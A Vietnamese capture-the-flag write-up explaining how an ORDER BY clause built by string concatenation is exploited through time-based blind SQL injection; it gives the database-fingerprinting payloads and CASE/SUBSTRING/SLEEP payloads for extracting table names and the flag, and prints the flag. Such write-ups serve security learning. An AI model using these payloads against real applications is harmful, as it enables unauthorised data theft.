Đã biết câu query là `SELECT * FROM products ORDER BY $order_by DESC` với giá trị biến `$order_by` lấy từ Request POST và chỉ qua duy nhất 1 hàm filter 
```php
detect_hacker($input){
    return trim($input);
}
``` 
có tác dụng loại bỏ khoảng trắng thừa ở đầu và cuối chuỗi `$input`. 

Do không sử dụng Prepared Statements mà nối chuỗi để tạo câu query luôn,nên có thể inject payload một cách dễ dàng để khai thác SQL Injection. 

Do ta chỉ có thể inject payload vào sau ORDER BY,ta không thể viết câu truy vấn UNION phía sau câu lệnh ORDER BY được mà phải sử dụng Blind SQL Injection để khai thác. 

Kiểm tra database với payload `?order_by=(SELECT current_database())` 

![test Postgreql](https://i.imgur.com/f1692Ha.png) 

Result trả về 0,tức là query lỗi,nên không phải sử dụng Postgreql 

Kiểm tra lại với payload `?order_by=(SELECT SELECT DATABASE())` 

![test Mysql](https://i.imgur.com/izjFlds.png) 

Oke vậy là MySQL hoặc MariaDB 

Ta sẽ dùng Time-based để dò từng ký tự. 

Code exploit: [Code Exploit](https://github.com/dungNHVhust/WriteupWeb/blob/main/CyRadar/Test%20CTF/Web04/exploit.py)

Tìm tên bảng với payload `(SELECT CASE WHEN ((SELECT SUBSTRING(table_name,{position},1) FROM information_schema.tables WHERE table_name LIKE 'fla%' LIMIT 1)) = '{character}' THEN (SELECT SLEEP(5)) ELSE price END AS result)` để tìm tên bảng. 

Tra từng ký tự của flag với payload `(SELECT CASE WHEN (SELECT SUBSTRING(flag, {position}, 1) FROM flag LIMIT 1) = '{character}' THEN (SELECT SLEEP(5)) ELSE price END AS result)` 

Flag: CHH{INJ3CT1ON_0RDER_GR0UP_CLAUS3}


